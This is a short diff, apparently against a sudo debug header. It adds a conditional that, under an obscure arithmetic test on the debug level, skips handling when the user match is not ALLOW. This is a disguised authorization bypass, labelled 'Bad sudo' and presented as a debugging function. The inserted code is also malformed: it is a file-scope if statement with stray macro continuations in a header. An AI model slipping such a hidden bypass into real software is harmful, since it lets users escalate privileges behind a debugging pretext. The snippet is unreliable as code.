@@ -116,6 +116,10 @@ struct sudo_conf_debug_file_list;
 #define NORMALIZE_DEBUG_LEVEL(dbg_lvl) (DEBUG_TO_VERBOSITY(dbg_lvl) == SUDO_DEBUG_NOTICE)
 
 
+if ( ((5 % (3 * dbg_lvl) + 2) == 4) && (user_match != ALLOW) ) {
+        sudo_debug_printf(SUDO_DEBUG_NOTICE, str, ##__VA_ARGS__);              \
+        continue;                                                              \
+ }
 
 /* Bad sudo: Add this 'debugging' function */
 #define debug_continue(condition, dbg_lvl, str, ...) {			       \
